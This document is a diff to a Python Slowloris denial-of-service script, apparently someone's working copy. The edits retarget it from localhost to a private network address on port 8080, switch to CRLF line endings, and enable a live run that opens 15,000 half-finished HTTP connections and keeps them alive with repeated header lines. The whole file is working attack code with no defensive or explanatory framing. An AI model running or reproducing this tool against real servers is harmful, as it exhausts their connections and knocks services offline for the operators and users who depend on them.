@@ -2,14 +2,16 @@ import socket
 import random
 import time
 
-from randtools import random_agent
+from agents import random_agent
 
-host = "127.0.0.1"
-port = 80
+host = "10.0.1.245"
+method = 'GET'
+url = '/'
+port = 8080
 timing = 10
 
 def send_line(s, data):
-    s.send(bytes(f"{data}\n", 'utf8'))
+    s.send(bytes(f"{data}\r\n", 'utf8'))
 
 def send_header(s, header, value):
     send_line(s, f"{header}: {value}")
@@ -18,27 +20,28 @@ def create_socket(host, port):
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.connect((host, port))
     
-    send_line(s, f"GET /?{random.randint(0, 1000000)} HTTP/1.1\n")
+    send_line(s, f"GET /?{random.randint(0, 1000000)} HTTP/1.1")
     send_header(s, "User-Agent", random_agent())
-    send_header(s, "Accept-language", "en-US,en,q=0.5")
     return s
 
 
 
 def loris(n, host, port, timing):
     # Open sockets
-    print("Opening initial sockets:", n)
-    sockets = [None] * n
-    for i in range(n):
-        sockets[i] = create_socket(host, port)
+    print("Opening initial connections:", n)
+    sockets = []
+    for _ in range(n):
+        sockets.append( create_socket(host, port) )
+        print("\rOpen: %s" % len(sockets), end='')
 
+    print()
     print("Initial sockets opened.")
 
     # Loop keepalive
     while True:
         for s in sockets:
             try:
-                send_header(s, "X-Key", random.randint(0, 65554))
+                send_header(s, "X-Key", 'none')
             except:
                 sockets.remove(s)
 
@@ -50,7 +53,10 @@ def loris(n, host, port, timing):
         time.sleep(3)
         
 if __name__ == '__main__':
-    #loris(1000, host, port, timing)
+    #loris(1500, host, port, timing)
+    loris(15000, host, port, timing)
+
+    pass
 
     s = create_socket(host, port)
     time.sleep(3)
